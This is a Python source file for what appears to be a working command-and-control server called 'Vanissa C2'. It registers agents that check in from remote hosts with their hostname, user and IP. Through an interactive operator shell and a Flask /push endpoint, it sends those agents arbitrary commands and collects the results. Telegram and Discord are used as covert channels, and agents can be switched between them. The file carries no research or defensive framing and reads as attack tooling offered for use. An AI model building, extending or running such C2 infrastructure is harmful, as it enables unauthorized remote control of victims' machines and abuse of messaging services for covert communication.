"""
╔══════════════════════════════════════════════╗
║  VANISSA C2 — OPERATOR CONSOLE               ║
║  Multi-Agent · Multi-Channel · Threaded       ║
╚══════════════════════════════════════════════╝

Protocol:
  CHECKIN      agent → server   CHECKIN|agent_id|hostname|os|user|ip
  INSTRUCTION  server → agent   INSTRUCTION|agent_id|instr_id|command
  RESULT       agent → server   RESULT|agent_id|instr_id|output
  SWITCH       server → agent   SWITCH|agent_id|channel_name
  SWITCHACK    agent → server   SWITCHACK|agent_id|channel_name
"""

import os
import sys
import time
import uuid
import logging
import threading

from flask import Flask, request, jsonify
from dotenv import load_dotenv

from core.agent import AgentRegistry
from core.channel import C2Channel

# ─────────────────────────────────────────
# Bootstrap
# ─────────────────────────────────────────

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(name)-22s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("vanissa")

app = Flask(__name__)

# ─────────────────────────────────────────
# Shared state
# ─────────────────────────────────────────

registry = AgentRegistry()
channel_map: dict[str, C2Channel] = {}        # "telegram" -> TelegramChannel, "discord" -> DiscordChannel
pending_results: dict[str, str | None] = {}
results_lock = threading.Lock()
selected_agent: str | None = None


# ─────────────────────────────────────────
# Callbacks (called by channels)
# ─────────────────────────────────────────

def on_result(agent_id: str, instruction_id: str, output: str, channel_name: str):
    """Called when any channel receives a RESULT message."""
    registry.update_last_seen(agent_id, channel_name)
    with results_lock:
        if instruction_id in pending_results:
            pending_results[instruction_id] = output
            log.info(f"[{channel_name}] Result for [{instruction_id}] from {agent_id}")


def on_checkin(agent_id: str, hostname: str, os_name: str, user: str, ip: str, channel_name: str):
    """Called when any channel receives a CHECKIN message."""
    registry.register(agent_id, hostname, os_name, user, ip, channel_name)
    print(f"\n  {GREEN}★ Agent checked in: {agent_id} ({hostname} / {user}@{ip}) via {channel_name}{RESET}")
    _reprint_prompt()


def on_switchack(agent_id: str, channel_name: str):
    """Called when any channel receives a SWITCHACK message."""
    registry.update_channel(agent_id, channel_name)
    print(f"\n  {CYAN}↔ Agent {agent_id} switched to {channel_name}{RESET}")
    _reprint_prompt()


# ─────────────────────────────────────────
# Channel factory
# ─────────────────────────────────────────

def build_channels() -> dict[str, C2Channel]:
    """Initialize enabled channels from env vars."""
    channels = {}

    # ── Telegram ───────────────────────────
    api_id   = os.getenv("API_ID")
    api_hash = os.getenv("API_HASH")
    phone    = os.getenv("PHONE")
    chat_id  = os.getenv("CHAT_ID")

    if all([api_id, api_hash, phone, chat_id]):
        from channels.telegram import TelegramChannel
        ch = TelegramChannel(
            api_id=int(api_id),
            api_hash=api_hash,
            phone=phone,
            chat_id=int(chat_id),
            registry=registry,
        )
        _wire_callbacks(ch)
        channels["telegram"] = ch
        log.info("Telegram channel configured")
    else:
        log.warning("Telegram channel disabled — missing env vars")

    # ── Discord ────────────────────────────
    discord_token = os.getenv("DISCORD_TOKEN")
    discord_ch_id = os.getenv("DISCORD_CHANNEL_ID")

    if discord_token and discord_ch_id:
        try:
            ch_id_int = int(discord_ch_id)
        except ValueError:
            log.warning(f"Discord disabled — DISCORD_CHANNEL_ID '{discord_ch_id}' is not a valid integer")
            ch_id_int = None

        if ch_id_int is not None:
            from channels.discord import DiscordChannel
            ch = DiscordChannel(
                token=discord_token,
                channel_id=ch_id_int,
                registry=registry,
            )
            _wire_callbacks(ch)
            channels["discord"] = ch
            log.info("Discord channel configured")
    else:
        log.warning("Discord channel disabled — missing DISCORD_TOKEN or DISCORD_CHANNEL_ID")

    return channels


def _wire_callbacks(ch: C2Channel):
    ch.set_result_callback(on_result)
    ch.set_checkin_callback(on_checkin)
    ch.set_switchack_callback(on_switchack)


# ─────────────────────────────────────────
# Command dispatch — TARGETED to agent's channel
# ─────────────────────────────────────────

def send_command(command: str, agent_id: str = None, timeout: int = 30) -> dict:
    """
    Send a command to a specific agent via their active channel.
    If no agent_id is provided but one is selected, use that.
    """
    target = agent_id or selected_agent

    instruction_id = str(uuid.uuid4())[:8]

    with results_lock:
        pending_results[instruction_id] = None

    # Determine which channel to send on
    if target:
        agent = registry.get(target)
        if agent and agent.channel in channel_map:
            # Send via the agent's active channel only
            ch = channel_map[agent.channel]
            try:
                ch.send_instruction(target, instruction_id, command)
            except Exception as e:
                log.error(f"[{ch.name}] Failed to send: {e}")
        else:
            # Agent not registered or channel unknown — broadcast to all
            for ch in channel_map.values():
                try:
                    ch.send_instruction(target, instruction_id, command)
                except Exception as e:
                    log.error(f"[{ch.name}] Failed to send: {e}")
    else:
        # No agent selected — broadcast to all channels
        for ch in channel_map.values():
            try:
                ch.send_instruction("*", instruction_id, command)
            except Exception as e:
                log.error(f"[{ch.name}] Failed to send: {e}")

    log.info(f"[{instruction_id}] $ {command} → {target or 'broadcast'}")

    # Wait for result
    waited = 0.0
    while waited < timeout:
        with results_lock:
            result = pending_results.get(instruction_id)
        if result is not None:
            with results_lock:
                del pending_results[instruction_id]
            return {"ok": True, "id": instruction_id, "result": result}
        time.sleep(0.5)
        waited += 0.5

    with results_lock:
        pending_results.pop(instruction_id, None)
    return {"ok": False, "id": instruction_id, "result": "Timeout — no response"}


def send_switch(agent_id: str, target_channel: str) -> bool:
    """Send a SWITCH command to an agent via their current active channel."""
    agent = registry.get(agent_id)
    if not agent:
        return False

    current_ch = channel_map.get(agent.channel)
    if not current_ch:
        return False

    try:
        current_ch.send_switch(agent_id, target_channel)
        log.info(f"SWITCH command sent to {agent_id} → {target_channel}")
        return True
    except Exception as e:
        log.error(f"Failed to send SWITCH: {e}")
        return False


# ─────────────────────────────────────────
# Flask API
# ─────────────────────────────────────────

@app.route("/push", methods=["POST"])
def api_push():
    data = request.get_json()
    if not data or "instruction" not in data:
        return jsonify({"error": "missing 'instruction' field"}), 400
    agent_id = data.get("agent_id")
    result = send_command(data["instruction"], agent_id=agent_id)
    return jsonify(result)


@app.route("/agents", methods=["GET"])
def api_agents():
    agents = registry.list_all()
    return jsonify({
        "count": len(agents),
        "agents": [
            {
                "id":        a.agent_id,
                "hostname":  a.hostname,
                "os":        a.os,
                "user":      a.user,
                "ip":        a.ip,
                "channel":   a.channel,
                "status":    a.status,
                "last_seen": a.elapsed(),
            }
            for a in agents
        ],
    })


@app.route("/health", methods=["GET"])
def api_health():
    with results_lock:
        pending = len(pending_results)
    return jsonify({
        "status":   "running",
        "agents":   registry.count(),
        "channels": list(channel_map.keys()),
        "pending":  pending,
    })


# ─────────────────────────────────────────
# Operator Shell
# ─────────────────────────────────────────

BANNER = r"""
 ╔══════════════════════════════════════════════════════════════════╗
 ║   ██╗   ██╗ █████╗ ███╗   ██╗██╗███████╗███████╗ █████╗       ║
 ║   ██║   ██║██╔══██╗████╗  ██║██║██╔════╝██╔════╝██╔══██╗      ║
 ║   ██║   ██║███████║██╔██╗ ██║██║███████╗███████╗███████║      ║
 ║   ╚██╗ ██╔╝██╔══██║██║╚██╗██║██║╚════██║╚════██║██╔══██║      ║
 ║    ╚████╔╝ ██║  ██║██║ ╚████║██║███████║███████║██║  ██║      ║
 ║     ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝      ║
 ║                   VANISSA C2 — OPERATOR                         ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║  agents              — list connected agents                    ║
 ║  use <id>            — select target agent                      ║
 ║  info                — details on selected agent                ║
 ║  channels            — list active C2 channels                  ║
 ║  switch <channel>    — switch agent to another channel           ║
 ║  back                — deselect agent                           ║
 ║  <command>           — execute on target agent                   ║
 ║  exit                — shut down                                ║
 ╚══════════════════════════════════════════════════════════════════╝
"""

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def _reprint_prompt():
    """Reprint the prompt after an async notification."""
    global selected_agent
    if selected_agent:
        agent = registry.get(selected_agent)
        label = agent.hostname if agent else selected_agent
        print(f"{RED}{BOLD}vanissa{RESET}({CYAN}{label}{RESET})> ", end="", flush=True)
    else:
        print(f"{RED}{BOLD}vanissa{RESET}> ", end="", flush=True)


def print_agents():
    agents = registry.list_all()
    if not agents:
        print(f"\n  {YELLOW}No agents connected yet.{RESET}\n")
        return

    print(f"\n  {BOLD}{CYAN}{'ID':<12} {'HOST':<14} {'USER':<12} {'IP':<16} {'OS':<12} {'CH':<10} {'LAST SEEN':<10}{RESET}")
    print(f"  {'─'*86}")
    for a in agents:
        color = GREEN if a.status == "active" else YELLOW
        print(
            f"  {color}{a.agent_id:<12} {a.hostname:<14} {a.user:<12} "
            f"{a.ip:<16} {a.os:<12} {a.channel:<10} {a.elapsed():<10}{RESET}"
        )
    print()


def print_channels():
    if not channel_map:
        print(f"\n  {YELLOW}No channels active.{RESET}\n")
        return

    print(f"\n  {BOLD}{CYAN}Active C2 Channels:{RESET}")
    for name, ch in channel_map.items():
        connected = "●" if hasattr(ch, '_connected') and ch._connected else "○"
        print(f"  {GREEN}  {connected} {name}{RESET}")
    print()


def interactive_shell():
    global selected_agent

    time.sleep(3)
    print(f"{CYAN}{BANNER}{RESET}")

    while True:
        try:
            if selected_agent:
                agent = registry.get(selected_agent)
                label = agent.hostname if agent else selected_agent
                prompt = f"{RED}{BOLD}vanissa{RESET}({CYAN}{label}{RESET})> "
            else:
                prompt = f"{RED}{BOLD}vanissa{RESET}> "

            cmd = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n{YELLOW}Shutting down...{RESET}")
            break

        if not cmd:
            continue

        lower = cmd.lower()

        # ── Built-in commands ──────────────
        if lower == "exit":
            print(f"{YELLOW}Goodbye, operator.{RESET}")
            os._exit(0)

        elif lower == "agents":
            print_agents()

        elif lower == "channels":
            print_channels()

        elif lower == "back":
            selected_agent = None
            print(f"  {YELLOW}Agent deselected.{RESET}")

        elif lower == "info":
            if not selected_agent:
                print(f"  {YELLOW}No agent selected. Use 'use <id>'{RESET}")
            else:
                agent = registry.get(selected_agent)
                if agent:
                    print(f"\n{CYAN}{agent.summary()}{RESET}\n")
                else:
                    print(f"  {YELLOW}Agent {selected_agent} not found in registry.{RESET}")

        elif lower.startswith("use "):
            target = cmd[4:].strip()
            if not target:
                print(f"  {YELLOW}Usage: use <agent_id>{RESET}")
                continue

            agents = registry.list_all()
            matches = [a for a in agents if a.agent_id.startswith(target)]
            if len(matches) == 1:
                selected_agent = matches[0].agent_id
                print(f"  {GREEN}Selected agent: {selected_agent} ({matches[0].hostname}) on {matches[0].channel}{RESET}")
            elif len(matches) > 1:
                print(f"  {YELLOW}Ambiguous — matches: {[a.agent_id for a in matches]}{RESET}")
            else:
                selected_agent = target
                print(f"  {YELLOW}Agent '{target}' not in registry — selected anyway{RESET}")

        elif lower.startswith("switch "):
            target_channel = cmd[7:].strip().lower()
            if not selected_agent:
                print(f"  {YELLOW}No agent selected. Use 'use <id>' first.{RESET}")
            elif target_channel not in channel_map:
                print(f"  {YELLOW}Unknown channel '{target_channel}'. Available: {list(channel_map.keys())}{RESET}")
            else:
                agent = registry.get(selected_agent)
                if agent and agent.channel == target_channel:
                    print(f"  {YELLOW}Agent is already on {target_channel}.{RESET}")
                elif send_switch(selected_agent, target_channel):
                    print(f"  {GREEN}SWITCH command sent to {selected_agent} → {target_channel}{RESET}")
                    print(f"  {CYAN}Waiting for SWITCHACK...{RESET}")
                else:
                    print(f"  {RED}Failed to send SWITCH command.{RESET}")

        elif lower == "help":
            print(f"{CYAN}{BANNER}{RESET}")

        # ── Execute command on agent ──────
        else:
            if not channel_map:
                print(f"  {YELLOW}No active channels — cannot send commands.{RESET}")
                continue

            if not selected_agent:
                print(f"  {YELLOW}No agent selected. Use 'use <id>' first.{RESET}")
                continue

            result = send_command(cmd)
            if result["ok"]:
                print(f"\n{GREEN}{result['result']}{RESET}\n")
            else:
                print(f"\n{RED}{result['result']}{RESET}\n")


# ─────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────

if __name__ == "__main__":
    print(f"{CYAN}[*] Initializing Vanissa C2 Server...{RESET}")

    channel_map = build_channels()

    if not channel_map:
        log.error("No channels configured — check your .env file")
        sys.exit(1)

    for name, ch in channel_map.items():
        try:
            ch.connect()
            log.info(f"[{name}] Channel online ✓")
        except Exception as e:
            log.error(f"[{name}] Failed to connect: {e}")

    # Remove channels that failed to connect
    channel_map = {n: ch for n, ch in channel_map.items() if hasattr(ch, '_connected') and ch._connected}

    if not channel_map:
        log.error("All channels failed to connect — exiting")
        sys.exit(1)

    # Start Flask API in background
    threading.Thread(
        target=lambda: app.run(debug=False, port=5000, use_reloader=False),
        daemon=True,
        name="flask-api",
    ).start()

    log.info(f"Flask API running on http://127.0.0.1:5000")
    log.info(f"Active channels: {list(channel_map.keys())}")

    # Operator shell in main thread
    interactive_shell()
